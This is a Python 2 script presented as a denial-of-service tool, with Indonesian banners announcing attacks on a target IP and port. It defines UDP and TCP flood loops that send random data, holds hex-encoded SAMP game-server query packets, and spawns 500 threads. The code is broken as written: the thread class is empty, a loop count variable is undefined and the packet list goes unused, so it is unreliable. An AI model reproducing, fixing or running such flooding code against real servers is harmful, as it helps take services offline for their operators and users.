import socket, struct, codecs, sys, threading, random, time, os
ip = sys.argv[1]
port = sys.argv[2]
orgip = ip
Pacotes = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]

os.system("clear")
print ' \033[95m******************************************'
print ' \033[95m=========== \033[94mDDOS TOOLS ANDRE\033[95m==========='               
print ' ******************************************'
print("\033[91mTOK TOK PAKET SAMPAI IP \033[92m%s \033[91mDAN TANDA TANGAN KEPORT \033[92m%s!!"%(ip,port))

class MyThread(threading.Thread):

def udp():
  data = random._urandom(1025)
  for x in range(times):
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
      #while True:
          s.sendto(data,addr)
          print("UDP Attack To IP", ip, "PORT", port)
    except:
      s.close()

def tcp():
  data = random._urandom(3615)
  for x in range(times):
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
          s.send(data)
          print("\033[1;36;40mTcp Attack To IP", ip, "PORT", port)
    except:
      s.close() 



if __name__ == '__main__':
    try:
        for x in range(500):
            mythread = MyThread()
            mythread.start()
            time.sleep(.1)

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print '************************'
        print '** DDOS TOOLS XR COMMUNITY **'
        print '************************'
        print '\n\n'
        print ('BERHENTI MENYERANG {}').format(orgip)